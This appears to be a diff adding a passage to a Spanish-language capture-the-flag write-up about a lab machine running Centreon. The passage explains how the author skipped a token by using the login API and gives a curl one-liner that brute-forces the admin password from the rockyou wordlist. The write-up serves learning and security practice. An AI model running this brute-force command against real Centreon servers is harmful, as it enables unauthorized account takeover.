@@ -39,3 +39,16 @@ La misma web nos da la información que estamos contra un login de versión 19.0
 
 Esto es muy bueno ya que haciendo una busqueda simple en Google, vemos varios CVE y podemos ver que es vulnerable a **RCE**.
 Para poder ejecutar estos CVE necesitamos acceso a una cuenta administrador, pero puesto que no tengo ninguno, intentaré bruteforcearlo.
+
+Encontré un script que me ahorraba tiempo para el bruteforce, pero al echarle un ojo quise aprender como funcionaba. Hay un token que nos limita el bruteforce, así que decidi mirar un poco más a fondo. Encontré que este sistema tiene una api que de primera me decia **Unauthorized**. Con una busqueda en google de la API, en la sección de Authenticación pude ver la data que espera la API. Por esta via será mucho más rápido y eficiente que intentar manipular la petición con el token.
+
+Monté un oneliner como este:
+
+`while read line; do request=$(curl -s -X POST "http://10.10.10.157/centreon/api/index.php?action=authenticate" -d "username=admin&password=$line" | tr -d "\""); if [ $request != "Bad credentials" ];then echo -e "\n"'[*] Password found: '$line; break; fi ; done < /usr/share/wordlists/rockyou.txt`
+
+Funciono. Conseguí la password: `password1`
+
+Y efectivamente era la correcta. 
+Tal como se puede mostrar en la imagen, nos ha dejado loguearnos.
+
+![image](https://user-images.githubusercontent.com/87484792/184038497-785183bd-a2e8-4d03-b853-7d061616b1fb.png)
